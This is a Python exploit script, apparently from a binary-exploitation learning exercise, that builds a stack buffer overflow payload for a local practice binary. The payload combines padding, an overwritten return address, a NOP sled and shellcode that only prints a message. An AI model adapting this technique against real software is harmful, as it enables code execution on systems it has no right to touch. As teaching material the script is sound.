import struct
import pwn

# This is an example for the most basic buffer overflow attack
# This script simply generates a payload to overflow a buffer and execute shell code

# Shellcode compiled with:
# python /home/purple/Documents/binaryExploitation/shellcode_utilities/makeasm.py 64 clean basicShellCode.asm

shellcode = b'\x58\x58\x58\x58\x48\x31\xc0\x66\xb8\x6e\x64\x50\x48\xb8\x59\x6f\x75\x67\x6f\x74\x50\x77\x50\x48\x89\xe0\x50\x48\x31\xc0\xb0\x01\x48\x31\xd2\xb2\x01\x5e\xb2\x0c\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05'

# 0x00007fffffffdcd0 is the next address after our overflow (the start of our nop sled)
# We will jump to 0x00007fffffffdd08 instead to try and hit the middle of the nop sled 
# This is to be safer and account for potential enviromental differences
evil_return_addr = struct.pack("<Q", 0x00007fffffffdd08)

nopsled = b'\x90'*384 # Hex 90 is the nop instruction

payload = b'a'*152 # We found 148 to be the index of the tail end of rbp using cyclic, meaning 152 is the offset to our return address
payload += evil_return_addr
payload += nopsled
payload += shellcode

print(f"length of payload: {len(payload)}")

# Write the payload to a file
with open("payload", "wb") as file:
    file.write(payload)


# target = pwn.process(['./vulnBin', "payload"])
# target.interactive()